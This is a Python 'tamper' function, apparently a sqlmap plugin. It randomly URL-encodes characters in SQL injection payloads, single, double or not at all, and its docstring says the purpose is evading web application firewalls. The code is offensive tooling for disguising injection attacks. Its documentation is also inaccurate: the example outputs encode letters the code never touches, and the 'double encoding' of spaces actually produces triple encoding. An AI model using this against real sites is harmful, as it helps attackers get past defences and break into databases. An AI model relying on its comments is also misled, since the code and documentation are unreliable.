import urllib.parse
import random

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Randomly URL-encodes characters in the payload with varying levels
    (none, single, or double encoding), and randomly uses '+' or '%20'
    for spaces. Designed for WAF evasion through unpredictability.

    Example:
    Input: 'UNION SELECT 1,2--'
    Output could be highly variable, like:
    '%2555NION%20SELECT%2B1%2C2%2D%2D'
    or
    'U%4eION%20%53ELECT%201,2--'
    or even with double encoding:
    '%2555%254eION%20%2553ELECT%201%2C2%2D%2D'
    """
    if not payload:
        return payload

    ret_chars = [] # Using a list for efficient character appending

    for char in payload:
        # Alphanumeric characters and a few common unreserved URI characters
        # are often not encoded unless specifically forced.
        # We'll generally leave them as is to avoid over-bloating the payload
        # and focus randomness on characters WAFs expect to see encoded.
        if char.isalnum() or char in "-_.~": # Common unreserved characters
            ret_chars.append(char)
            continue

        # Randomly decide on the encoding strategy for 'encodeable' characters
        # - 0: Don't encode (leave as original char, adds a bit of chaos if WAF expects encoding)
        # - 1: Single URL encode (e.g., ' ' -> '%20', "'" -> '%27')
        # - 2: Double URL encode (e.g., ' ' -> '%2520', "'" -> '%2527')
        # - 3: For space specifically, use '+' (then apply further encoding if double)
        
        # Adjusting the random range to give different probabilities.
        # This makes it more likely to apply *some* encoding, but still allows for skipping.
        encoding_strategy = random.randint(0, 3) 

        if char == ' ':
            if encoding_strategy == 3: # 25% chance for '+'
                ret_chars.append('+')
            elif encoding_strategy == 2: # 25% chance for double encoding '%20'
                ret_chars.append(urllib.parse.quote(urllib.parse.quote('%20'))) # Ensure literal %20 is double encoded
            elif encoding_strategy == 1: # 25% chance for single encoding '%20'
                ret_chars.append('%20')
            else: # encoding_strategy == 0 (25% chance to leave space as is, which might break things but hey, randomness)
                ret_chars.append(char)
        else: # For other special characters (quotes, operators, etc.)
            if encoding_strategy == 2: # 25% chance for double encoding
                ret_chars.append(urllib.parse.quote(urllib.parse.quote(char)))
            elif encoding_strategy == 1: # 25% chance for single encoding
                ret_chars.append(urllib.parse.quote(char))
            elif encoding_strategy == 0: # 25% chance to not encode
                ret_chars.append(char)
            else: # encoding_strategy == 3, reroute for non-space characters
                # Fallback to single encode, or another random choice, to avoid leaving it untouched too often
                ret_chars.append(urllib.parse.quote(char))

    return "".join(ret_chars)

